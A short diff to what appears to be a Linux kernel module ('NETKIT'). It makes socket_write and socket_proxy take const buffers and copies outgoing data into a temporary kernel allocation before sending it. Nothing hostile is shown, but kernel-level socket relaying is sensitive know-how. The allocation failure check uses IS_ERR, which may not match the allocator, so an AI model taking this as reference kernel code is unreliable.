@@ -123,24 +123,32 @@ LAB_ERR:
     return retv;
 }
 
-int socket_write(struct socket *sk, u8 *content, size_t content_len)
+int socket_write(struct socket *sk, const u8 *content, size_t content_len)
 {
 	struct msghdr msg;
 	struct kvec vec = {
-        .iov_base = content,
         .iov_len = content_len
     };
     int count;
 
     memset(&msg, '\x00', sizeof(msg));
 
+    // cheat on const qualifier
+    vec.iov_base = kzmalloc(content_len, GFP_KERNEL);
+    if (IS_ERR(vec.iov_base))
+        return PTR_ERR(vec.iov_base);
+
+    memcpy(vec.iov_base, content, content_len);
+
     count = kernel_sendmsg(sk, &msg, &vec, 1, content_len);
     NETKIT_LOG("[+] wrote %u bytes to socket\n", count);
+
+    kzfree(vec.iov_base, content_len);
 
     return count;
 }
 
-int socket_proxy(__be32 ip, __be16 port, u8 *in_buf, size_t in_buflen, u8 **out_buf, size_t *out_buflen)
+int socket_proxy(__be32 ip, __be16 port, const u8 *in_buf, size_t in_buflen, u8 **out_buf, size_t *out_buflen)
 {
     static struct socket *sock;
     struct sockaddr_in *addr;
